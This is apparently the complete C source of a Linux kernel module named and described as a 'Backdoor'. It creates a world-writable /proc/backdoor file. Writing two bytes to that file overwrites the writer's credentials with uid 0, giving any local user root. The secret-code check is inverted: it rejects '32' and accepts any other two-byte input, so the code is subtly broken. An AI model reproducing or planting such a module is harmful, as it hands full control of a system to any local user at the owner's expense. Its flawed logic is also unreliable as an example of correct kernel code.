#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/security.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MaxVorosh");
MODULE_DESCRIPTION("Backdoor");
MODULE_VERSION("0.1");

#define DEVICE_NAME "backdoor"
#define SECRET_CODE "32"
#define SECRET_CODE_LENGTH 2

static struct proc_dir_entry *proc_entry;

static long unsafe_setuid(uid_t uid) {
    struct cred *new_creds;
    kuid_t new_kuid;
    
    new_kuid = make_kuid(current_user_ns(), uid);
    if (!uid_valid(new_kuid))
        return -EINVAL;
    
    new_creds = prepare_creds();
    if (!new_creds)
        return -ENOMEM;
    
    new_creds->uid = new_kuid;
    new_creds->euid = new_kuid;
    new_creds->suid = new_kuid;
    new_creds->fsuid = new_kuid;
    
    return commit_creds(new_creds);
}

static ssize_t backdoor_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
	if (len != SECRET_CODE_LENGTH) {
		pr_info("backdoor: Not a secret code given, wrong length");
		return len;
	}
	char data[SECRET_CODE_LENGTH];
	int result = copy_from_user(data, buf, SECRET_CODE_LENGTH);
	if (result != 0) {
		pr_info("backdoor: Copy from user error");
		return -EFAULT;
	}
	if (!memcmp(SECRET_CODE, data, SECRET_CODE_LENGTH)) {
		pr_info("backdoor: Not a secret code given, wrong code");
		return len;
	}
	int retval = unsafe_setuid(0);
	if (retval != 0) {
		pr_info("backdoor: Error in setuid: %d", retval);
		return retval;
	}
	return len;
}

static const struct proc_ops backdoor_fops = {
    .proc_write = backdoor_write,
};

static int __init backdoor_init(void)
{
	proc_entry = proc_create(DEVICE_NAME, 0666, NULL, &backdoor_fops);
    if (!proc_entry) {
        pr_err("backdoor: Cannot create procfs file");
        return -ENOMEM;
    }
    
    pr_info("backdoor: Module inited");
    return 0;
}

static void __exit backdoor_exit(void)
{
	remove_proc_entry(DEVICE_NAME, NULL);

	pr_info("backdoor: module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);

